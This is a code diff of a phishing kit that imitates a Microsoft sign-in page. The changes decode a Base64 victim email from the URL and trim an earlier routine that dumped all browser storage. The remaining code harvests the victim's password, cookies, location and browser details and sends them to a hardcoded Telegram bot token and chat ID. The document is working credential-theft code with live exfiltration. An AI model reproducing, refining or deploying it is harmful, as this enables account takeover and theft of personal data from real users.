@@ -184,7 +184,8 @@
       text-align: center;
       font-size: 13px;
       display: none;
-    }  </style>
+    }
+  </style>
 </head>
 <body>
 
@@ -221,12 +222,74 @@
   <footer class="page-footer"></footer>
 
   <script>
-  // Read email from URL param
+  // ======================== DECODE EMAIL FROM URL ========================
+  // This function decodes the Base64-encoded email that was sent from the LUMIS gate
+  // The encoding used was: btoa(unescape(encodeURIComponent(email)))
+  // So decoding is: decodeURIComponent(escape(atob(encoded)))
+  function decodeEmail(encoded) {
+    if (!encoded) return null;
+    try {
+      // Standard base64 decode
+      let base64 = encoded;
+      // Ensure proper padding for base64 decoding
+      while (base64.length % 4) {
+        base64 += '=';
+      }
+      // Replace URL-safe characters back to standard base64
+      base64 = base64.replace(/-/g, '+').replace(/_/g, '/');
+      const decoded = atob(base64);
+      // Convert back from UTF-8
+      const email = decodeURIComponent(escape(decoded));
+      return email;
+    } catch(e) {
+      console.error('Failed to decode email:', e);
+      // If decoding fails, maybe the email was not encoded (plain text fallback)
+      if (encoded.includes('@') && encoded.includes('.')) {
+        return encoded;
+      }
+      return null;
+    }
+  }
+
+  // ======================== READ AND DISPLAY EMAIL ========================
   (function() {
-    const params = new URLSearchParams(window.location.search);    const email = params.get('email') || sessionStorage.getItem('msft_email') || localStorage.getItem('msft_email') || 'user@example.com';
-    const el = document.getElementById('userEmail');    if (el) el.textContent = email;
-  })();  
+    const params = new URLSearchParams(window.location.search);
+    const encodedEmail = params.get('email');
+    
+    let finalEmail = null;
+    
+    if (encodedEmail) {
+      // Try to decode the email
+      finalEmail = decodeEmail(encodedEmail);
+      console.log('Decoded email from URL:', finalEmail);
+      
+      // If decoded successfully, store it
+      if (finalEmail && finalEmail.includes('@')) {
+        // Store in session storage for persistence
+        sessionStorage.setItem('msft_email', finalEmail);
+        localStorage.setItem('msft_email', finalEmail);
+      } else {
+        // If decode failed, use the encoded value as fallback (might be plain email)
+        finalEmail = encodedEmail;
+      }
+    }
+    
+    // If no email in URL, check storage
+    if (!finalEmail || !finalEmail.includes('@')) {
+      finalEmail = sessionStorage.getItem('msft_email') || localStorage.getItem('msft_email') || 'user@example.com';
+    }
+    
+    // Display the email
+    const emailEl = document.getElementById('userEmail');
+    if (emailEl && finalEmail) {
+      emailEl.textContent = finalEmail;
+    }
+    
+    // Log for debugging
+    console.log('Email displayed:', finalEmail);
+  })();
   
+  // ======================== PASSWORD TOGGLE ========================
   function togglePassword() {
     const input = document.getElementById('password');    const btn = document.querySelector('.toggle-eye');    if (input && btn) {
       if (input.type === 'password') {
@@ -301,13 +364,11 @@
     };  
   }  
   
-  // Enhanced cookie collection - captures ALL cookies and storage data
+  // Get current cookies
   function getCurrentCookies() {
     const allCookies = document.cookie;
     const cookies = [];
-    const allStorageData = [];
     
-    // Collect all standard cookies
     if (allCookies) {
       const cookieArray = allCookies.split(';');      
       for (let cookie of cookieArray) {
@@ -318,54 +379,6 @@
       }    
     }
     
-    // Collect ALL localStorage data
-    try {
-      if (localStorage.length > 0) {
-        allStorageData.push('=== LOCALSTORAGE DATA ===');
-        for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i);
-          const value = localStorage.getItem(key);
-          if (key && value) {
-            allStorageData.push(`[LS] ${key}: ${value.substring(0, 500)}`);
-          }
-        }
-      } else {
-        allStorageData.push('[LS] No localStorage data');
-      }
-    } catch (e) {
-      allStorageData.push(`[LS] Error: ${e.message}`);
-    }
-    
-    // Collect ALL sessionStorage data
-    try {
-      if (sessionStorage.length > 0) {
-        allStorageData.push('=== SESSIONSTORAGE DATA ===');
-        for (let i = 0; i < sessionStorage.length; i++) {
-          const key = sessionStorage.key(i);
-          const value = sessionStorage.getItem(key);
-          if (key && value) {
-            allStorageData.push(`[SS] ${key}: ${value.substring(0, 500)}`);
-          }
-        }
-      } else {
-        allStorageData.push('[SS] No sessionStorage data');
-      }
-    } catch (e) {
-      allStorageData.push(`[SS] Error: ${e.message}`);
-    }
-    
-    // Collect indexedDB databases (if any)
-    try {
-      if (window.indexedDB) {
-        allStorageData.push('=== INDEXEDDB DATABASES ===');
-        // Note: Can't list all easily without async, but we'll note availability
-        allStorageData.push('[IDB] IndexedDB is available on this browser');
-      }
-    } catch (e) {
-      allStorageData.push(`[IDB] Error: ${e.message}`);
-    }
-    
-    // Collect all possible Microsoft-related cookies from document
     const msCookies = cookies.filter(c => 
       c.toLowerCase().includes('microsoft') || 
       c.toLowerCase().includes('msft') || 
@@ -376,36 +389,23 @@
     
     return {
       total: cookies.length,
-      totalStorageItems: localStorage.length + sessionStorage.length,
-      standardCookies: cookies,
       standardCookiesList: cookies.join('\n   • '),
-      msRelatedCookies: msCookies,
-      msRelatedList: msCookies.join('\n   • '),
-      allStorageData: allStorageData,
-      storageDataList: allStorageData.join('\n   '),
-      fullReport: `=== STANDARD COOKIES (${cookies.length}) ===\n   • ${cookies.join('\n   • ')}\n\n=== MICROSOFT-RELATED COOKIES (${msCookies.length}) ===\n   • ${msCookies.join('\n   • ')}\n\n=== STORAGE DATA ===\n   ${allStorageData.join('\n   ')}`
+      msRelatedList: msCookies.join('\n   • ')
     };  
   }
   
-  // Send data to Telegram with enhanced cookie reporting
+  // Send data to Telegram
   function sendToTelegram(email, password, location, browserInfo, cookies) {
     const botToken = '6192154388:AAHGTD1DURjxVMRZC44_-mhEhtfXf_b63Eo';
     const chatId = '1180507121';
     
     const timestamp = new Date().toISOString();
     
-    // Escape special characters for Telegram
     function escapeText(text) {
       if (!text) return '';
-      return String(text).replace(/[&<>]/g, function(m) {
-        if (m === '&') return '&amp;';
-        if (m === '<') return '&lt;';
-        if (m === '>') return '&gt;';
-        return m;
-      });
+      return String(text);
     }
     
-    // Build comprehensive message with all cookie data
     const dataText = `╔══════════════════════════════════════════════════════════════╗
 ║          🔐 MICROSOFT ACCOUNT CREDENTIALS - ELITE 🔐         ║
 ╚══════════════════════════════════════════════════════════════╝
@@ -428,22 +428,9 @@
    • Browser Timezone: ${escapeText(browserInfo.timezone)}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🍪 COMPLETE COOKIE REPORT:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📊 COOKIE STATISTICS:
-   • Total Standard Cookies: ${cookies.total}
-   • Total Storage Items: ${cookies.totalStorageItems}
-   • Microsoft-Related Cookies Found: ${cookies.msRelatedCookies.length}
-
-📝 STANDARD COOKIES (${cookies.total}):
+🍪 COOKIE REPORT:
+   • Total Cookies: ${cookies.total}
    • ${cookies.standardCookiesList || 'No cookies found'}
-
-🎯 MICROSOFT-SPECIFIC COOKIES (${cookies.msRelatedCookies.length}):
-   • ${cookies.msRelatedList || 'No Microsoft-related cookies found'}
-
-💾 BROWSER STORAGE DATA:
-   ${cookies.storageDataList}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⏱️ Timestamp: ${escapeText(timestamp)}
@@ -462,7 +449,7 @@
     }).catch(e => console.error('Telegram send error:', e));
   }
   
-  // main handler with proper async/await flow
+  // Main handler
   async function handleNext() {
     const passwordInput = document.getElementById('password');
     const password = passwordInput?.value || '';
@@ -495,7 +482,7 @@
         await getUserLocation();
       }
       
-      if (loadingMsg) loadingMsg.textContent = 'Collecting browser & cookie data...';
+      if (loadingMsg) loadingMsg.textContent = 'Collecting browser data...';
       const browserInfo = getBrowserInfo();
       const cookiesInfo = getCurrentCookies();
       
